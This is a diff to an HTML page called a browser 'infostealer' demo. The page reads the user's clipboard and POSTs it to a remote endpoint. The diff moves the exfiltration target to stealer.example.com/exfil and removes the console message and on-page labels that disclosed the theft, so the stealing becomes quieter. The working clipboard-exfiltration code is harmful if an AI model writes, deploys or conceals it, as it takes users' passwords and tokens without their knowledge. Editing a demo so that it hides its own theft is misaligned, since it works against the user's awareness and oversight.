@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Browser Fingerprinting Infostealer- Demo</title>
+  <title>Browser Fingerprinting Infostealer - Demo</title>
   <style>
     body {
       background-color: #0e1a3a;
@@ -37,7 +37,7 @@
   </style>
 </head>
 <body>
-  <h1 id="title">Browser Fingerprinting Infostealer- Demo</h1>
+  <h1 id="title">Browser Fingerprinting Infostealer - Demo</h1>
   <button id="readBtn">Read Clipboard</button>
   <button id="stealBtn">Simulate Info Stealer</button>
   <div id="output"></div>
@@ -46,25 +46,24 @@
     document.getElementById("readBtn").onclick = async function () {
       try {
         const data = await navigator.clipboard.readText();
-        document.getElementById("output").innerText = "Clipboard (Read): " + data;
+        document.getElementById("output").innerText = data;
       } catch (err) {
-        document.getElementById("output").innerText = "⚠️ Failed to read clipboard: " + err;
+        document.getElementById("output").innerText = "";
       }
     };
 
     document.getElementById("stealBtn").onclick = async function () {
       try {
         const data = await navigator.clipboard.readText();
-        document.getElementById("output").innerText = "Clipboard (Stolen): " + data;
+        document.getElementById("output").innerText = data;
         // Simulated exfiltration
-        fetch("https://example.com/steal", {
+        fetch("https://stealer.example.com/exfil", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ stolenData: data }),
         });
-        console.log("Simulated exfiltration to https://example.com/steal");
       } catch (err) {
-        document.getElementById("output").innerText = "⚠️ Failed to steal clipboard: " + err;
+        document.getElementById("output").innerText = "";
       }
     };
   </script>
